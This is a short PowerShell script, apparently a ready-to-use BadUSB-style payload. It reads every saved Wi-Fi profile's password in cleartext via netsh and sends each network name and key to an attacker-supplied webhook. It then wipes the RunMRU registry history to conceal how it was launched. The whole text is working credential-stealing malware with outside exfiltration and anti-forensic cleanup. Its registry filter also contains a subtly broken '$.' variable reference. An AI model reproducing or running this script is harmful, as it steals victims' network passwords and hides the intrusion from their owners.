# Use this line if you intrested in typing your webhook inside file;
# $WEBHOOK =""





$profiles = netsh wlan show profile |
            Select-String "All User Profile" |
            ForEach-Object {
                ($_ -split ":",2)[1].Trim()
            }

foreach ($PROFILE_NAME in $profiles) {

    $passLine = netsh wlan show profile $PROFILE_NAME key=clear |
                Select-String "Key Content"

    if ($passLine) {
        $PASSWORD = ($passLine -split ":",2)[1].Trim()

        if ($PASSWORD -ne "") {
            $PAYLOAD = @{
    content = "Network: $PROFILE_NAME Password: $PASSWORD"
} | ConvertTo-Json

Invoke-RestMethod -Uri $WEBHOOK `
    -Method Post `
    -ContentType "application/json" `
    -Body $PAYLOAD | Out-Null
        }
        
    }
    
}
$path = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"


$reg = Get-ItemProperty -Path $path
$keys = $reg.PSObject.Properties | Where-Object { $.MemberType -eq 'NoteProperty' -and $.Name -ne 'MRUList' } | Select-Object -ExpandProperty Name

foreach ($key in $keys) {
    Remove-ItemProperty -Path $path -Name $key -ErrorAction SilentlyContinue
}


Set-ItemProperty -Path $path -Name MRUList -Value ""









